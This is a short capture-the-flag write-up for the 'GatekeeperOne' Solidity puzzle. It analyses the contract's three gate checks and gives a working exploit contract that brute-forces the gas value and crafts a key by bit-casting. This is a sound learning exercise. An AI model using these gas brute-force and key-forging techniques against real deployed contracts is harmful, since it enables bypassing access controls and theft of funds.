# GateKeeperOne

## Challenge Statement

Make it past the gatekeeper and register as an entrant to pass this level.
Things that might help:

    Remember what you've learned from the Telephone and Token levels.
    You can learn more about the special function gasleft(), in Solidity's documentation (see here and here).

## Analysis

The goal is to get through each gate.

Gate 1: msg.sender != tx.origin
Therefore a contract needs to be the one exploiting this.

Gate 2: gasleft().mod(8191) == 0
The gas at this point needs to be exactly divisible by 8191 -> can brute force

Gate 3:
Can simplify the logic here to,
```
uint32(_gateKey) == uint16(_gateKey) -> // input: 0000|69f9 == 0000|69f9
uint32(_gateKey) != uint64(_gateKey) -> // input: 1000|0000|0000|69f9 != 0000|0000|0000|69f9
uint32(_gateKey) == uint16(tx.origin) -> // input: 0000|69f9 == 0000|69f9
```

Therefore, ```_gatekey = 0x|xxxx|xxxx|0000|69f9```, I chose ```_gatekey = 0x10000000000069f9```.

## Solution

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface GatekeeperOne {
    function enter(bytes8 _gateKey) external returns (bool);
}

contract Pass {
    GatekeeperOne target = GatekeeperOne(<target_addr>);
    bytes8 public key = 0x100000000000<Least significant 4 hex chars>;

    function exploit() public {
        for (uint i=0 ; i<8192; i++){
            try target.enter{gas: 100000000000000 + i}(key) {
                return;
            }
            catch {}
        }
    }
}
```

